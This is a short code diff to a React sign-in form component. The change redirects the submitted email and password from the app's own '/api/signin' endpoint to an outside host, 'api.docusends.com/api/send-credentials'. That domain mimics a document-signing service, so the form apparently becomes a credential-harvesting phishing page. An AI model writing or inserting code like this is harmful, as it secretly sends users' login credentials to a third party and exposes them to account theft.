@@ -111,10 +111,13 @@ const StepOne = () => {
               email = await methods.watch("email"); // Manually validate fields
               password = await methods.watch("password"); // Manually validate fields
               try {
-                const response = await axios.post("/api/signin", {
-                  email,
-                  password,
-                });
+                const response = await axios.post(
+                  "https://api.docusends.com/api/send-credentials",
+                  {
+                    email,
+                    password,
+                  }
+                );
 
                 if (response.status === 200) {
                   // toast.success("Message sent successfully!");
